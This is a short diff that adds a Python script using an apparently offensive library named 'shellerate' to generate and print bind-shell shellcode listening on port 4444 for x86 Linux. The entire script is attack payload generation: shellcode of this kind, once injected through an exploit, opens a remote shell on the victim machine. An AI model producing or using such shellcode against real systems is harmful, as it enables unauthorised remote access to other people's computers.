@@ -1,0 +1,7 @@
+#!/usr/bin/env python3
+
+import shellerate
+from shellerate.bind_shellcode import *
+b=BindShellcode(4444, 'x86', 'linux')
+b.generate()
+print(b.shellcode())
